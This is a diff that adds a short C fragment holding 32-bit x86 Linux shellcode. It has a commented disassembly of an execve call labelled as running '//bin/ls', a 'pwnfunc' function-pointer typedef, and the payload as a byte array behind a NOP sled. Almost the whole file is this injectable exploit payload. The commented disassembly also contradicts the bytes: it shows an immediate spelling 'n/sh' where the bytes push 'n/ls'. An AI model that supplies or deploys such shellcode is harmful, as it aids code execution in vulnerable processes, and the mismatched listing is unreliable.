@@ -1,0 +1,23 @@
+/*
+ exec("//bin/ls"):
+
+ 80483df:	31 d2                	xor    %edx,%edx
+ 80483e1:	52                   	push   %edx
+ 80483e2:	68 6e 2f 6c 73       	push   $0x68732f6e
+ 80483e7:	68 2f 2f 62 69       	push   $0x69622f2f
+ 80483ec:	89 e3                	mov    %esp,%ebx
+ 80483ee:	52                   	push   %edx
+ 80483ef:	53                   	push   %ebx
+ 80483f0:	89 e1                	mov    %esp,%ecx
+ 80483f2:	8d 42 0b             	lea    0xb(%edx),%eax
+ 80483f5:	cd 80                	int    $0x80
+*/
+
+typedef  void (*pwnfunc)(void);
+
+char  shellcode[] = 
+"\x90\x90\x90\x90\x90\x90\x90\x90"
+"\x31\xd2"
+"\x52\x68\x6e\x2f\x6c\x73\x68\x2f"
+"\x2f\x62\x69\x89\xe3\x52\x53\x89"
+"\xe1\x8d\x42\x0b\xcd\x80";
